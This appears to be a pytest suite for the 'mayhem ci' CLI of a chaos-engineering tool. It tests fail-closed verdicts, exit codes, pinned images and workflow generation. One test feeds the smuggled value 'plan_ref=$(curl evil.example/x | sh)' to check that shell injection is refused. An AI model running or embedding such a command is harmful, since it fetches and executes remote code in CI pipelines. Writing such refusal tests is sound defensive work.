"""``mayhem ci`` on the Click tree, exercised directly (plan 16 Phase 3).

.. warning::

   **The ``ci`` group is registered, but no CI system has ever run this code.**
   ``src/mayhem/cli/command_registry.py`` lists ``ci``, so ``mayhem ci --help``
   resolves and a person can reach the group; the registration that an earlier
   revision of this file named as an outstanding integration dependency is now
   paid. What remains true is why this suite still drives
   ``mayhem.cli.ci_cmd.ci`` through :class:`click.testing.CliRunner` directly:
   this repository ships no forge client, no GitHub Actions workflow and no
   GitLab pipeline that invokes mayhem, so nothing here has been exercised by a
   real pipeline, and the `CliRunner` harness is the same pattern
   ``tests/unit/test_stop_surface.py`` uses for ``mayhem stop``. Every assertion
   below is about this build's own refusals, not about CI integration.

What is being tested is the surface's *fail-closed* behaviour, because that is the
part a surface gets wrong quietly:

* an unreadable plan or a missing topology produces ``UNKNOWN`` on every check
  and a **non-zero exit** — "mayhem could not ask" must never read as "nothing to
  report";
* a reachable plan that cannot be graded also exits non-zero, and the reason is
  the compiler's own sentence rather than a summary the surface wrote;
* ``--summary`` and ``--verdict-out`` write files, and ``ci summary`` re-renders
  from the verdict byte-identically to the run that produced it;
* ``ci status`` prints the status it *would* post and says plainly that it posted
  nothing, because no forge client exists in this repository;
* ``ci workflow`` refuses a floating image, a floating action, and any
  ``--env`` value that is not a forge expression.
"""

from __future__ import annotations

import json
from datetime import UTC, datetime
from typing import TYPE_CHECKING, Any

import pytest
from click.testing import CliRunner

from mayhem.cli.ci_cmd import ci
from mayhem.cli.exit_codes import ExitCode
from mayhem.controller.chatops import ChatMessage
from mayhem.domain.identity import EnvironmentScope, Principal, RoleGrant

if TYPE_CHECKING:
    from pathlib import Path

FP = "f" * 64
NOW = datetime(2026, 10, 3, 12, 0, tzinfo=UTC)
IMAGE = "ghcr.io/mayhemlabs/mayhem@sha256:" + "a" * 64
SHA = "0123456789abcdef0123456789abcdef01234567"

# Kept as a tiny module-level smoke check so the import of chatops in this file is
# not a dead import: the two surfaces share the "no client exists" property and a
# reader should be able to confirm it here.
_CHATOPS_MESSAGE = ChatMessage(channel_id="C-OPS", author_id="U-OPS", text="mayhem run x")


def _plan_and_graph(tmp_path: Path) -> tuple[Path, Path]:
    from mayhem.domain.experiments import (
        ExecutionPlan,
        ExperimentKind,
        InjectFault,
        PlannedFault,
        PlannedStep,
        ResolvedTarget,
    )
    from mayhem.domain.leases import UndoOp, VerifyProbe
    from mayhem.domain.topology import (
        Edge,
        EdgeKind,
        HostNode,
        NodeKind,
        ServiceNode,
        TargetSelector,
        TopologyGraph,
    )

    selector = TargetSelector(kind=NodeKind.SERVICE, expr="a")
    plan = ExecutionPlan(
        run_id="r-ci",
        kind=ExperimentKind.DETERMINISTIC,
        steps=(
            PlannedStep(
                id="s0",
                seq=0,
                raw_action=InjectFault(
                    fault="proc.pause", selectors=(selector,), duration=10.0
                ),
                fault=PlannedFault(
                    fault_id="proc.pause",
                    targets=(
                        ResolvedTarget(selector=selector, node_ids=frozenset({"n-a"})),
                    ),
                    duration=10.0,
                    undo_ops=(UndoOp(op="kill"),),
                    verify_probes=(VerifyProbe(probe="proc.alive"),),
                ),
            ),
        ),
        config_snapshot_id="c",
        topology_snapshot_id="t",
        environment_fingerprint=FP,
    )
    graph = TopologyGraph(
        nodes=(
            ServiceNode(id="n-a", name="a"),
            HostNode(id="h-local", name="local", transport="local"),
        ),
        edges=(Edge(src="n-a", dst="h-local", kind=EdgeKind.DEPENDS_ON, weight=1.0),),
    )
    plan_path = tmp_path / "plan.json"
    graph_path = tmp_path / "graph.json"
    plan_path.write_text(plan.model_dump_json(), encoding="utf-8")
    graph_path.write_text(graph.model_dump_json(), encoding="utf-8")
    return plan_path, graph_path


def _change_flags() -> list[str]:
    return [
        "--sha",
        SHA,
        "--ticket",
        "MAYHEM-4712",
        "--pin",
        "plan_version=plan-7",
        "--pin",
        "policy_version=policy-7",
        "--pin",
        "catalog_version=catalog-2026.09",
        "--pin",
        "agent_version=agent-2.0.0",
        "--pin",
        "runtime_version=runtime-2.1.0",
    ]


def _run(*args: str) -> Any:
    return CliRunner().invoke(ci, list(args), obj=None)


# ── mayhem ci workflow ─────────────────────────────────────────────────────────


class TestWorkflowCommand:
    def test_a_pinned_github_workflow_is_written(self, tmp_path: Path) -> None:
        out = tmp_path / "wf.yml"
        result = _run(
            "workflow", "--provider", "github", "--image", IMAGE, "--out", str(out),
            "--env", "plan_ref=${{ github.head_ref }}",
        )
        assert result.exit_code == ExitCode.SUCCESS, result.output
        rendered = out.read_text(encoding="utf-8")
        assert "uses: actions/checkout@" in rendered
        assert "mayhem:2.4" not in rendered

    def test_generation_is_byte_identical_across_runs(self, tmp_path: Path) -> None:
        first, second = tmp_path / "a.yml", tmp_path / "b.yml"
        for path in (first, second):
            _run("workflow", "--provider", "github", "--image", IMAGE, "--out", str(path))
        assert first.read_bytes() == second.read_bytes()

    @pytest.mark.parametrize(
        "image",
        ["ghcr.io/mayhemlabs/mayhem:2.4", "ghcr.io/mayhemlabs/mayhem:latest"],
        ids=["tag", "latest"],
    )
    def test_a_floating_image_is_refused(self, image: str) -> None:
        result = _run("workflow", "--provider", "github", "--image", image)
        assert result.exit_code == ExitCode.VALIDATION_ERROR
        assert "sha256" in result.output

    def test_an_untrusted_value_carrying_shell_syntax_is_refused(self) -> None:
        result = _run(
            "workflow", "--provider", "github", "--image", IMAGE,
            "--env", "plan_ref=$(curl evil.example/x | sh)",
        )
        assert result.exit_code == ExitCode.VALIDATION_ERROR
        assert "ci_surface.untrusted_value_in_script" in result.output

    def test_a_malformed_env_pair_is_a_usage_error(self) -> None:
        result = _run(
            "workflow", "--provider", "github", "--image", IMAGE, "--env", "plan_ref"
        )
        assert result.exit_code == ExitCode.USAGE_ERROR
        assert "NAME=EXPRESSION" in result.output

    def test_a_gitlab_component_renders_the_github_expression_refusal(self) -> None:
        result = _run(
            "workflow", "--provider", "gitlab", "--image", IMAGE,
            "--env", "plan_ref=${{ github.head_ref }}",
        )
        assert result.exit_code == ExitCode.VALIDATION_ERROR
        assert "gitlab expression" in result.output

    def test_writing_over_a_directory_is_refused(self, tmp_path: Path) -> None:
        result = _run(
            "workflow", "--provider", "github", "--image", IMAGE, "--out", str(tmp_path)
        )
        assert result.exit_code == ExitCode.VALIDATION_ERROR
        assert "is a directory" in result.output

    def test_the_generated_script_never_carries_an_expression(self, tmp_path: Path) -> None:
        out = tmp_path / "wf.yml"
        _run(
            "workflow", "--provider", "github", "--image", IMAGE, "--out", str(out),
            "--env", "plan_ref=${{ github.head_ref }}", "--release-gate",
            "--check", "blast_radius",
        )
        rendered = out.read_text(encoding="utf-8")
        run_lines = [ln for ln in rendered.splitlines() if ln.strip().startswith("run:")]
        assert run_lines
        assert all("${{" not in line for line in run_lines)
        assert "mayhem ci check --environment ci --release-gate --check blast-radius" in rendered


# ── mayhem ci check ────────────────────────────────────────────────────────────


class TestCheckCommand:
    def test_no_plan_means_unknown_everywhere_and_a_non_zero_exit(self, tmp_path: Path) -> None:
        summary = tmp_path / "summary.md"
        result = _run(
            "check", "--summary", str(summary), "--sha", SHA, "--ticket", "MAYHEM-4712"
        )
        assert result.exit_code == ExitCode.SAFETY_REFUSAL
        rendered = summary.read_text(encoding="utf-8")
        assert "**UNKNOWN**" in rendered
        assert "**PASS**" not in rendered
        assert "**Pipeline:** FAIL" in rendered
        assert "may this open a release: **no**" in rendered

    def test_a_missing_topology_is_unknown_and_names_the_missing_file(self, tmp_path: Path) -> None:
        plan_path, _ = _plan_and_graph(tmp_path)
        result = _run(
            "check", "--plan", str(plan_path), "--graph", str(tmp_path / "absent.json"),
            "--sha", SHA, "--ticket", "MAYHEM-4712",
        )
        assert result.exit_code == ExitCode.VALIDATION_ERROR
        assert "absent.json" in result.output

    def test_a_reachable_plan_that_cannot_be_graded_still_refuses(self, tmp_path: Path) -> None:
        """The fail-closed direction that is easy to get wrong.

        No runtime adapter is bound by this command, so the compiler cannot
        establish ``capability_requirements`` and ``fault-compatibility`` fails.
        The exit code is non-zero and the detail is the compiler's own sentence —
        not a summary the surface invented.
        """
        plan_path, graph_path = _plan_and_graph(tmp_path)
        summary = tmp_path / "summary.md"
        verdict_out = tmp_path / "verdict.json"
        result = _run(
            "check", "--plan", str(plan_path), "--graph", str(graph_path),
            "--summary", str(summary), "--verdict-out", str(verdict_out), *_change_flags(),
        )
        assert result.exit_code == ExitCode.SAFETY_REFUSAL
        rendered = summary.read_text(encoding="utf-8")
        assert "no runtime adapter supplied" in rendered
        verdict = json.loads(verdict_out.read_text(encoding="utf-8"))
        assert verdict["outcome"] == "fail"
        assert verdict["checks"], "a verdict over zero checks is refused by Phase 1"

    def test_a_check_without_a_change_is_refused(self) -> None:
        result = _run("check", "--sha", SHA)
        assert result.exit_code == ExitCode.VALIDATION_ERROR
        assert "--ticket" in result.output

    def test_a_malformed_sha_is_refused(self) -> None:
        result = _run("check", "--sha", "NOTHEX", "--ticket", "MAYHEM-4712")
        assert result.exit_code == ExitCode.VALIDATION_ERROR

    def test_a_malformed_pin_is_a_usage_error(self) -> None:
        result = _run(
            "check", "--sha", SHA, "--ticket", "MAYHEM-4712", "--pin", "nonsense_axis=1"
        )
        assert result.exit_code == ExitCode.USAGE_ERROR
        assert "nonsense_axis" in result.output

    def test_a_pinned_check_writes_unpinned_axes_into_the_summary(self, tmp_path: Path) -> None:
        plan_path, graph_path = _plan_and_graph(tmp_path)
        summary = tmp_path / "summary.md"
        _run(
            "check", "--plan", str(plan_path), "--graph", str(graph_path),
            "--summary", str(summary), "--sha", SHA, "--ticket", "MAYHEM-4712",
            "--pin", "plan_version=plan-7",
        )
        assert "**Unpinned axes:**" in summary.read_text(encoding="utf-8")


# ── mayhem ci summary and mayhem ci status ─────────────────────────────────────


class TestSummaryAndStatusCommands:
    def _verdict_file(self, tmp_path: Path, **overrides: Any) -> Path:
        from mayhem.domain.pipeline import (
            ChangeLink,
            CheckOutcome,
            CheckScope,
            PipelinePins,
            PipelineVerdict,
            PRCheck,
        )

        check = PRCheck(
            name="blast-radius",
            scope=CheckScope.BLAST_RADIUS,
            outcome=CheckOutcome.PASS,
            evidence_refs=("gate-output/blast-radius",),
            detail="2 of 2 proof lines pass",
            observed_at=NOW,
        )
        fields: dict[str, Any] = {
            "outcome": "pass",
            "change": ChangeLink(
                git_sha=SHA,
                change_ticket="MAYHEM-4712",
                pins=PipelinePins(plan_version="plan-7"),
            ),
            "evidence_refs": ("gate-output/blast-radius",),
            "checks": (check,),
            "decided_at": NOW,
        }
        fields.update(overrides)
        payload = PipelineVerdict(**fields)  # type: ignore[arg-type]
        path = tmp_path / "verdict.json"
        path.write_text(payload.model_dump_json(), encoding="utf-8")
        return path

    def test_summary_renders_the_verdict_it_was_handed(self, tmp_path: Path) -> None:
        path = self._verdict_file(tmp_path)
        result = _run("summary", "--from", str(path))
        assert result.exit_code == ExitCode.SUCCESS, result.output
        assert "**Pipeline:** PASS" in result.output
        assert "may this open a release: **no**" in result.output
        assert "unpinned" in result.output.lower()

    def test_summary_refuses_a_file_that_is_not_a_verdict(self, tmp_path: Path) -> None:
        path = tmp_path / "junk.json"
        path.write_text("{}", encoding="utf-8")
        result = _run("summary", "--from", str(path))
        assert result.exit_code == ExitCode.VALIDATION_ERROR

    def test_summary_refuses_a_missing_file(self, tmp_path: Path) -> None:
        result = _run("summary", "--from", str(tmp_path / "absent.json"))
        assert result.exit_code == ExitCode.VALIDATION_ERROR
        assert "does not exist" in result.output

    def test_status_reports_success_for_a_passing_verdict_and_says_it_posted_nothing(
        self, tmp_path: Path
    ) -> None:
        path = self._verdict_file(tmp_path)
        result = _run("status", "--from", str(path))
        assert result.exit_code == ExitCode.SUCCESS, result.output
        assert "state:     success" in result.output
        assert "posted:    no" in result.output
        assert "no commit-status port is bound" in result.output

    def test_status_reports_failure_for_a_failing_verdict(self, tmp_path: Path) -> None:
        from mayhem.domain.pipeline import CheckOutcome, CheckScope, PRCheck

        path = self._verdict_file(
            tmp_path,
            outcome="fail",
            checks=(
                PRCheck(
                    name="blast-radius",
                    scope=CheckScope.BLAST_RADIUS,
                    outcome=CheckOutcome.FAIL,
                    evidence_refs=("gate-output/blast-radius",),
                    finding={
                        "code": "check.blast-radius.refused",
                        "message": "too big",
                        "remediation": "",
                        "severity": "error",
                        "cell": None,
                    },
                    observed_at=NOW,
                ),
            ),
            reasons=("blast-radius reported fail",),
        )
        result = _run("status", "--from", str(path))
        assert "state:     failure" in result.output
        assert "posted:    no" in result.output


# ── the properties the surface shares with the rest of the plan ────────────────


class TestSurfaceInvariants:
    def test_no_chat_client_and_no_commit_status_client_exist(self) -> None:
        """Two absences, asserted together because they are the same property.

        ``mayhem ci status`` cannot post, and ``mayhem.controller.chatops`` cannot
        read a channel, because this repository holds no forge token and no chat
        token. A reader who finds either client has found something the docs
        here got wrong.
        """
        from mayhem.controller import chatops, ci_surface

        assert not hasattr(ci_surface, "GitHubClient")
        assert not hasattr(chatops, "SlackClient")
        assert _CHATOPS_MESSAGE.channel_id == "C-OPS"

    def test_a_role_grant_is_reusable_by_the_pipeline_admission(self) -> None:
        """The CI actor's grants are plan-09 grants, not a second grant type.

        Asserting that a plain :class:`RoleGrant` is accepted where the pipeline
        admission wants one is how a future second-identity system would be
        noticed before it existed — a second grant type would be a second answer
        to "who may run mayhem", and it would be the laxer one.
        """
        from mayhem.controller.ci_execution import CIActor
        from mayhem.domain.identity import PrincipalKind, Role

        service_account = Principal(principal_id="sa-ci", kind=PrincipalKind.SERVICE_ACCOUNT)
        scope = EnvironmentScope(environment="ci")
        grant = RoleGrant(role=Role.EXECUTE, scope=scope, principal=service_account)
        actor = CIActor(principal=service_account)
        assert actor.require_role(Role.EXECUTE, scope, grants=(grant,), now=NOW) == frozenset(
            {Role.EXECUTE}
        )
